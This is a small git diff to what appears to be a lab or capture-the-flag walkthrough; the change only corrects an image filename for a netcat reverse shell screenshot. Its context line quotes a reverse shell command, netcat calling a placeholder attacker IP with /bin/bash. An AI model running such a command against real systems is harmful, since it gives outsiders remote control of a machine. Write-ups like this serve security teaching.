@@ -147,7 +147,7 @@ nc <ATTACKER_IP> <PORT> -e /bin/bash
 ```
 
 <p align="center">
-  <img src="./Assets/06-netcat-reverse-shell.png.png" alt="Netcat reverse shell foothold" width="700">
+  <img src="./Assets/06-netcat-reverse-shell.png" alt="Netcat reverse shell foothold" width="700">
 </p>
 
 Shell stabilization was performed to move from a raw netcat listener to a fully interactive TTY:
